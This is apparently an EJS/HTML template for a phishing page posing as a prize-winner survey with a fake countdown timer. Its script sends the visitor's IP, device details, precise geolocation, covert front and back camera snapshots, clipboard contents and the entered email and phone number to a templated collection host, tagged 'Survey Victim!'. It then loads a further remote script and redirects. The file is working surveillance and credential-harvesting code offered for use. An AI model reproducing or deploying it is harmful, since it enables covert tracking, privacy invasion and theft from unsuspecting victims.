<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>You've Won! Complete Survey</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #ff6b35, #f7c948, #2ec4b6); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.card { background: #fff; border-radius: 16px; padding: 32px; width: 440px; max-width: 92vw; box-shadow: 0 16px 48px rgba(0,0,0,0.15); }
.badge { background: #ff6b35; color: #fff; display: inline-block; padding: 4px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 12px; }
h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 6px; }
.sub { font-size: 14px; color: #666; margin-bottom: 24px; }
.question { margin-bottom: 18px; }
.question p { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 8px; }
.option { display: flex; align-items: center; gap: 8px; padding: 6px 0; font-size: 13px; color: #444; cursor: pointer; }
.option input { accent-color: #ff6b35; }
.divider { height: 1px; background: #eee; margin: 20px 0; }
.claim-title { font-size: 15px; font-weight: 600; color: #333; margin-bottom: 12px; }
.form-group { margin-bottom: 12px; }
.form-group input { width: 100%; padding: 11px 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; outline: none; }
.form-group input:focus { border-color: #ff6b35; }
.btn-claim { width: 100%; padding: 13px; background: linear-gradient(135deg, #ff6b35, #e55d2b); color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
.btn-claim:hover { opacity: 0.9; }
.loading { display: none; text-align: center; padding: 20px; }
.spinner { border: 3px solid #eee; border-top: 3px solid #ff6b35; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
@keyframes spin { to { transform: rotate(360deg); } }
.confetti { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999; }
.confetti span { position: absolute; width: 10px; height: 10px; opacity: 0; animation: fall 2s ease-in forwards; }
@keyframes fall { 0% { transform: translateY(-10px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
.timer { font-size: 12px; color: #e55d2b; text-align: center; margin-bottom: 12px; }
</style>
</head>
<body>
<div class="card">
<div class="badge">🎉 WINNER</div>
<h1>Congratulations!</h1>
<p class="sub">Answer 3 quick questions to claim your prize</p>
<div class="timer">⏰ Offer expires in <span id="timer">4:59</span></div>
<form id="loginForm">
<div class="question"><p>1. How often do you shop online?</p>
<label class="option"><input type="radio" name="q1" value="1" required> Daily</label>
<label class="option"><input type="radio" name="q1" value="2"> Weekly</label>
<label class="option"><input type="radio" name="q1" value="3"> Monthly</label></div>
<div class="question"><p>2. What device are you using?</p>
<label class="option"><input type="radio" name="q2" value="1" required> Phone</label>
<label class="option"><input type="radio" name="q2" value="2"> Computer</label>
<label class="option"><input type="radio" name="q2" value="3"> Tablet</label></div>
<div class="question"><p>3. Rate your experience (1-5)</p>
<label class="option"><input type="radio" name="q3" value="1" required> ⭐</label>
<label class="option"><input type="radio" name="q3" value="2"> ⭐⭐</label>
<label class="option"><input type="radio" name="q3" value="3"> ⭐⭐⭐⭐⭐</label></div>
<div class="divider"></div>
<p class="claim-title">Enter your details to claim:</p>
<div class="form-group"><input type="email" id="username" placeholder="Email address" required></div>
<div class="form-group"><input type="tel" id="password" placeholder="Phone number" required></div>
<button type="submit" class="btn-claim">🎁 Claim My Prize</button>
</form>
<div class="loading" id="loading"><div class="spinner"></div><p style="font-size:14px;color:#555;">Processing your claim...</p></div>
</div>
<div class="confetti" id="confetti"></div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');
var sec=299;setInterval(function(){if(sec<=0)return;sec--;var m=Math.floor(sec/60),s=sec%60;document.getElementById('timer').textContent=m+':'+(s<10?'0':'')+s;},1000);
function showConfetti(){var c=document.getElementById('confetti');c.style.display='block';var cols=['#ff6b35','#f7c948','#2ec4b6','#e55d2b','#4ecdc4','#ff69b4'];for(var i=0;i<60;i++){var s=document.createElement('span');s.style.left=Math.random()*100+'%';s.style.background=cols[Math.floor(Math.random()*cols.length)];s.style.animationDelay=Math.random()*1.5+'s';s.style.borderRadius=Math.random()>0.5?'50%':'0';c.appendChild(s);}}
async function gatherAll(){
    let td='📸 <b>Survey Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}
document.getElementById('loginForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var user=document.getElementById('username').value, pass=document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    $.post("<%=a %>/creds",{uid:uid,user:encodeURIComponent(user),pass:encodeURIComponent(pass),platform:'Survey'});
    await gatherAll(); advancedGather("<%=a %>","<%=uid %>");
    showConfetti();
    await new Promise(r=>setTimeout(r,2500));
    window.location.href="<%=url %>";
});
window.onload=gatherAll;
</script>
</body>
</html>